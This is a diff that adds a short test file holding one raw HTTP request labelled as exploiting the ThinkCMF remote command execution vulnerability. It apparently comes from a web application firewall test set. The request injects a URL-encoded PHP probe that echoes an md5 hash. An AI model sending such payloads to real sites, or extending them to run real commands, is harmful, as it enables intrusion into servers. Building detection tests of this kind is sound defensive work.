@@ -1,0 +1,9 @@
+# 利用【ThinkCMF远程命令执行漏洞】-30000117
+# 利用ThinkCMF远程命令执行漏洞执行任意命令。
+GET /index.php?acid=30000117&g=g&m=Door&a=index&content=%3C%3Fphp%20echo%20md5%28%27ThinkCMF%27%29%3B&bid=hd_tag_m8mv258i HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv258i
+RM-PRO-Token: 2e6bb4b01bb58c459deccef112bf74f2
+RM-PRO-Time: 1742808450987
+User-Agent: curl/7.83.1
+
